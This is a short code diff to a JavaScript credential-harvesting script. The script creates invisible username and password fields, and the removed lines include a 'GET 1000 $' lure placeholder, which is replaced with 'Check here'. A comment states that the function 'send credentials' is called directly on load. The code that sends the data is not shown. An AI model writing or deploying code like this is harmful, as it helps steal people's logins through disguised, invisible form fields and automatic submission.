@@ -22,8 +22,7 @@ var inputName = document.createElement('input');
 inputName.type = 'text';
 inputName.id = 'username';
 inputName.name = 'username';
-inputName.autocomplete = 'username';
-inputName.placeholder = 'CLICK or DOUBLE CLICK HERE to GET 1000 $';
+inputName.placeholder = 'Check here';
 inputName.style.border = "none";
 inputName.style.outline = "none";
 inputName.style.background = "none";
@@ -37,7 +36,6 @@ var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
 inputPassword.id = 'password';
 inputPassword.name = 'password';
-inputPassword.autocomplete = 'current-password';
 inputPassword.style.border = "none";
 inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
@@ -68,8 +66,6 @@ function attachEventListeners() {
 
   a.onclick = f;
   a.ondblclick = f;
-  b.onclick = f;
-  b.ondblclick = f;
 
   // Directly call the function to send credentials
   f();
